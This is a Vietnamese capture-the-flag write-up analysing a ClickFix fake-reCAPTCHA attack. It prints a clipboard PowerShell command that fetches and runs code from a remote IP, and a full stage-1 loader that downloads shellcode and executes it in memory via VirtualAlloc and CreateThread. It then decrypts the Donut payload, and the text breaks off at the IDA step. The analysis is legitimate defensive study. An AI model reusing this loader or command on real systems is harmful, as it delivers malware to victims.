# Mr Robot

<img width="869" height="892" alt="image" src="https://github.com/user-attachments/assets/c790f63d-828c-40bf-8b74-765de85db65e" />

Challenge này mình sẽ chỉ có duy nhất 1 artifact là 1 cái url: **https://rededucation.aduma.online**.

Ở challenge này mình sẽ phân tích từng manh mối mà có được bên trong url kia, rồi sẽ thực hiện trả lời các câu hỏi được netcat đến ip:port - 161.33.2.236:31337. Đầu tiên khi mình search url kia thì nó sẽ hiện ra cho mình 1 ô recapcha:

<img width="932" height="440" alt="image" src="https://github.com/user-attachments/assets/899dc022-dc8d-4720-b9b9-19a5b1348d46" />

Thì kỹ thuật này mình có từng đọc trên một blog ở Facebook rồi thấy khá quen quen, thì khi victim thực hiện bắt đầu xác minh là con người, và hiện ra ô như trên, thì 1 command đã được dán sẳn vào phần clipboard rồi, và chỉ cần thực hiện theo attacker thì sẽ máy tính sẽ bắt đầu tải về payload, hoặc something else,...

Như mình đoán thì clipboard của mình sẽ có 1 lệnh powershell sau: `powershell -c iex(irm 152.42.186.220 -UseBasicParsing)`. Giờ mình sẽ check thử `http://152.42.186.220` để xem source là gì:

<img width="1999" height="1198" alt="image" src="https://github.com/user-attachments/assets/ff1fee85-4862-426f-819a-7bfc6b6e6d70" />

```
$u = "http://152.42.186.220/9cca20c6df659f72/m_cpt1267382.bin"



try {

    Write-Host "Loading..." 

    

    $d = Invoke-WebRequest -Uri $u -UseBasicParsing -ErrorAction Stop

    $b = $d.Content

    $s = $b.Length



    $c = @"

using System;

using System.Runtime.InteropServices;

public class W {

    [DllImport("kernel32.dll", SetLastError=true)]

    public static extern IntPtr GetCurrentProcess();

    [DllImport("kernel32.dll", SetLastError=true)]

    public static extern IntPtr VirtualAlloc(IntPtr a, uint sz, uint t, uint p);

    [DllImport("kernel32.dll", SetLastError=true)]

    public static extern IntPtr CreateThread(IntPtr ta, uint ss, IntPtr sa, IntPtr p, uint cf, out uint tid);

    [DllImport("kernel32.dll", SetLastError=true)]

    public static extern uint WaitForSingleObject(IntPtr h, uint ms);

}

"@



    Add-Type -TypeDefinition $c



    $m1 = 0x1000

    $m2 = 0x2000

    $p = 0x40

    

    $addr = [W]::VirtualAlloc([IntPtr]::Zero, $s, $m1 -bor $m2, $p)

    

    if ($addr -eq [IntPtr]::Zero) {

        throw "Alloc failed"

    }



    [System.Runtime.InteropServices.Marshal]::Copy($b, 0, $addr, $s)

    

    $tid = 0

    $th = [W]::CreateThread([IntPtr]::Zero, 0, $addr, [IntPtr]::Zero, 0, [ref]$tid)

    

    if ($th -eq [IntPtr]::Zero) {

        throw "Thread failed"

    }



    [W]::WaitForSingleObject($th, 30000) | Out-Null

    Write-Host "done."

    

} catch {

    Write-Error $_.Exception.Message

    exit 1

}

Beta
0 / 0
used queries
1
```

Ở đây mình sẽ có được source của stage 1 thực hiện tải về 1 file `m_cpt1267382.bin` về máy của victim khi họ dán command powershell kia vào thanh run của `Win R`, toàn bộ source này thực hiện chức năng chính là tải về file payload ở stage 1 kia.

Có được lệnh powershell thực hiện tải về payload đầu thì mình cũng trả lời được câu hỏi đầu tiên của challenge:

```
Q1: What command did the compromised website tell you to run?
     (Example: ping google.com -t)
> powershell -c iex(irm 152.42.186.220 -UseBasicParsing)
```

Tiếp theo mình cần biết website load payload này là từ đâu, mình nghĩ nó cũng sẽ nằm bên trong trang web mà đề cho nên mình thử view source bằng `F12`:

<img width="1976" height="1476" alt="image" src="https://github.com/user-attachments/assets/3b8b4178-ab4a-431f-80f0-6a027d0b6e8c" />

Ở đây mình sẽ thấy bên trong thẻ `<script>` có 1 chuỗi base64 `aHR0cHM6Ly9qc3JlcG8uYWR1bWEub25saW5lL25ldy5qcz8=`, mình thực hiện decode thử thì có được 1 link url khác -> `https://jsrepo.aduma.online/new.js`

Tới đây khi mình truy cập vào thì mình thấy source của web này đã hoàn toàn bị obfuscated, tới đây mình có dùng tools deobfuscated của `https://obf-io.deobfuscate.io/`, nhưng mạng lag quá mình không load được script deobfus, nên mình nhờ AI deobfus hộ:

```
```

Tới đây mình sẽ biết được trang web thực hiện load malicious payload là: https://jsrepo.aduma.online/new.js, nên mình trả lời được câu hỏi thứ 2:

```
Q2: Where does the website load malicious payload from?
     (Example: 8.8.8.8, https://google.com)
> https://jsrepo.aduma.online/new.js
```

Kỹ thuật ở đây được sử dụng là kỹ thuật **filefix - clickfix** dựa vào victim tự load payload vào hệ thống mà attacker không thực hiện trực tiếp.

Bây giờ mình sẽ tải về file `m_cpt1267382.bin`, mình sử dụng tools detect it easy để xem file này được compiler bằng ngôn ngữ gì:

<img width="1264" height="930" alt="image" src="https://github.com/user-attachments/assets/8d002212-a820-4f42-8909-1a901237e64d" />

File được compiler bằng donut shellcode, tới đây mình search trên mạng về donut shellcode là gì?

> Shellcode donut là một bộ mã không phụ thuộc vào vị trí của nó trong bộ nhớ, nó cho phép thực thi các file VBscript, Javascript, thực hiện load các file `.exe`, tự động embeded `.DLL` vào hệ thống. Một module do Donut tạo có thể được staged bởi 1 server C2 hoặc từ chính chương trình được load bên trong nó. Điểm đặc biệt là module này encrypt bằng cách sử dụng block cipher **Chaskey** và khóa được tạo ngẫu nhiên 128-bit, và sau khi file shellcode được load vào bộ nhớ nó sẽ có khả năng tự xóa đi các refernce gốc để tránh bị hệ thống scan.
>

Đây là một dạng shellcode byte và mình cần có một tools để decryptor ở [đây](https://github.com/volexity/donut-decryptor)

<img width="3793" height="1867" alt="image" src="https://github.com/user-attachments/assets/a43a946d-f497-4a58-9f12-ee6fc8962a31" />

Thực hiện `git clone` nó về và tải toàn bộ repo bằng lệnh `python3 -m pip install .`

Sau khi tải xong thì mình dùng lệnh sau để thực hiện decryptor toàn bộ file shellcode:

```
donut-decryptor m_cpt_bld172638.bin
```
<img width="1501" height="328" alt="image" src="https://github.com/user-attachments/assets/90975b5c-dd23-40c1-bab9-6509fcfaff3d" />

Sau đó mở ida lên để phân tích file module_pe.exe mà tools vừa parse ra:















